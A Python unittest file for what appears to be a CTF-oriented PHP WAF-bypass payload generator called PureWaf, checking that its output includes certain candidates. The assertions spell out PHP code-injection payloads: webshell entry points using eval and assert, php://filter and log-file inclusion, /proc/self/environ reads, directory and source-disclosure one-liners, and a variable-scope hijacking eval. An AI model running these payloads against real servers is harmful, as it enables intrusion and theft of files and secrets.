import unittest
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from PureWaf import bypass
from PureWaf import utils

class TestNewTechniques(unittest.TestCase):
    
    def test_filename_obfuscation(self):
        # 测试插入转义符
        path = "flag.php"
        escaped = utils.obfuscate_filename_escape(path)
        # 长度允许时应包含反斜杠
        if "\\" in escaped:
            print(f"Escaped path: {escaped}")
            self.assertIn("\\", escaped)
            self.assertNotEqual(escaped, path)
            
        # 测试插入引号
        quoted = utils.obfuscate_filename_quotes(path)
        if "''" in quoted:
            print(f"Quoted path: {quoted}")
            self.assertIn("''", quoted)
            self.assertNotEqual(quoted, path)

    def test_include_payloads(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含文件包含包装形式
        found_include = False
        for p in payloads:
            if "include" in p and "php://" in p:
                found_include = True
                break
        self.assertTrue(found_include, "Include with php://filter not found")

    def test_webshell_templates(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含执行入口
        found_eval = False
        for p in payloads:
            if "eval($_GET" in p or "assert($_POST" in p:
                found_eval = True
                break
        self.assertTrue(found_eval, "Webshell eval/assert payload not found")

    def test_log_inclusion(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=True,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含日志路径
        found_log = False
        for p in payloads:
            if "/var/log/nginx/access.log" in p or "/proc/self/environ" in p:
                found_log = True
                break
        self.assertTrue(found_log, "Log inclusion payload not found")

    def test_new_commands(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)
        
        # 检查是否包含编辑器命令
        found_vi = any(p.startswith("vi ") for p in payloads)
        self.assertTrue(found_vi, "vi command not found")
        
        # 检查是否包含过滤命令
        found_grep = any("grep" in p and "flag" in p for p in payloads)
        self.assertTrue(found_grep, "grep command not found")

    def test_directory_enumeration_templates(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=True, 
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "print_r(scandir(dirname(dirname(__FILE__))));",
            payloads,
            "Nested dirname+scandir payload not found",
        )
        self.assertIn(
            "var_export(glob('../*'));",
            payloads,
            "glob directory payload not found",
        )

    def test_file_enumeration_templates(self):
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "show_source(next(array_reverse(scandir(getcwd()))));",
            payloads,
            "next(array_reverse(scandir(...))) payload not found",
        )

    def test_variable_scope_hijacking_template(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True, 
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.0
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn(
            "eval(array_pop(next(get_defined_vars())));",
            payloads,
            "Variable scope hijacking payload not found",
        )

if __name__ == '__main__':
    unittest.main()
